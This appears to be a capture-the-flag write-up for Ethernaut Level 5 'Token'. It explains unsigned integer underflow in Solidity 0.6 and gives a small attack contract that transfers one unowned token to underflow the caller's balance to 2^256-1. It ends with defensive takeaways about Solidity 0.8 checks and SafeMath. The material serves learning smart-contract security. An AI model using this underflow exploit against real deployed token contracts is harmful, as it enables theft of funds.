<div align="center">
<p align="left">(<a href="https://github.com/Pedrojok01/Ethernaut-Solutions?tab=readme-ov-file#solutions">back</a>)</p>

<img src="../assets/levels/5-token.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 5 - Token</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [The hack](#the-hack)
  - [Examples](#examples)
- [Solution](#solution)
- [Takeaway](#takeaway)

## Objectif

<img src="../assets/requirements/5-token-requirements.webp" width="800px"/>

## The hack

> An odometer or odograph is an instrument used for measuring the distance traveled by a vehicle, such as a bicycle or car.

To succeed at this level, we have to understand the concept of underflow and overflow in solidity. All variables have a maximum value that they can hold, and if you try to add a value that exceeds this maximum, the variable will overflow and start from 0.

And since we are using mostly unsigned integers (uint) in solidity, variables also have a minimum value (0), and if you try to subtract a value that is greater than the current value, the variable will underflow and start from the maximum value.

### Examples

Solidity's unsigned integers have a fixed range of values they can represent. An overflow occurs when a calculation exceeds an unsigned integer's maximum value, and underflow happens when a calculation drops below an unsigned integer's minimum value (which is 0 for unsigned integers).

```javascript
pragma solidity ^0.6.0;

contract Example {
    uint8 public minValue = 0;
    uint8 public maxValue = 255;

    function underflow() public {
        // 0 - 1 = 255 (Underflow)
        minValue--;
    }

    function overflow() public {
        // 255 + 1 = 0 (Overflow)
        maxValue++;
    }
}
```

Fortunately for us, since solidity `0.8.0`, the compiler throws an error when an overflow or underflow occurs. But here, we can take advantage of this since we are using an older version of solidity.

## Solution

Since the contract is using solidity ^0.6.0, and since no `SafeMath` library is used, it is easy to create an underflow.

```javascript
require(balances[msg.sender] - _value >= 0);
```

The following contract will try to transfer 1 token (which he doesn't have) to our address, and the balance will underflow to the maximum value of uint256 (2^256 is a pretty big number).

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

contract UnsafeMath {
    address immutable token;

    constructor(address _token) {
        token = _token;
    }

    function attack() public {
        IToken(token).transfer(msg.sender, 1);
    }
}
```

Here is what will happen:

```javascript
require(balances[msg.sender] - _value >= 0); // Passed
// 0 - 1 = 2^256 - 1
balances[msg.sender] -= _value; // balances[msg.sender] = 2^256 - 1;
```

## Takeaway

- Always use a recent version of Solidity (^0.8.0) to benefit from native overflow and underflow checks.
- If you need to interact with a contract using a solidity version older than 0.8.0, always check that the contract is using a SafeMath library or equivalent.

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
